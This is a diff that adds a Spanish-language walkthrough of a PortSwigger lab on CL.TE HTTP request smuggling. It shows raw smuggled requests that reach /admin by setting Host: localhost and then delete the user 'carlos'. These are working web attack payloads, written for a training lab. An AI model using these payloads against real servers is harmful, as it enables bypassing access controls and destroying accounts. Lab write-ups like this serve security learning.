@@ -236,8 +236,71 @@ Content-Length: 15
 x=1
 0
 
+```
 
+# Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability
+
+El proposito de este laboratorio es entrar a el /admin mediante http request smugling para lo cual el front end acepta  Content-Length y el back end Trasfer-Encoding
+
+````
+POST / HTTP/1.1
+Host: your-lab-id.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 37
+Transfer-Encoding: chunked
+
+0
+
+GET /admin HTTP/1.1
+X-Ignore: X
+
+````
+Para que esto funcione se necesita enviar esta percicion dos veces nos damos cuenta que tiene un mensaje que dice que solo
+se puee acceder a ese panel admin usuarios locales entonces usamos la cabecera Host.
+
+### HOST
+
+>El encabezado de solicitud Host especifica el nombre de dominio del servidor (para hosting virtual), y (opcionalmente) el número de puerto TCP en el que el servidor esta escuchando.
+Si no se provee un puerto, se usará el puerto por defecto para el servicio solicitado (e.j.: "80" para una URL HTTP).
+El encabezado Host debe enviarse obligatoriamente en todas las solicitudes HTTP/1.1. Un código de error 400 (Petición mala) debería enviarse a cualquier solicitud HTTP/1.1 que no contiene o contiene más de un encabezado Host.
+
+Continuando on el lab ponemos la cabecera host con localhost
 
 ```
+POST / HTTP/1.1
+Host: your-lab-id.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 54
+Transfer-Encoding: chunked
+
+0
+
+GET /admin HTTP/1.1
+Host: localhost
+X-Ignore: X
+
+```
+Puede funcionar con X-Ignore: X ya sabiendo que se puede acceder a /admin solo borramos el usuario
+
+```
+
+POST / HTTP/1.1
+Host: your-lab-id.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 139
+Transfer-Encoding: chunked
+
+0
+
+GET /admin/delete?username=carlos HTTP/1.1
+Host: localhost
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10
+
+x=
+
+```
+
+Se borra el usuario carlos y se resuelve el lab
 
 > https://portswigger.net/web-security/request-smuggling
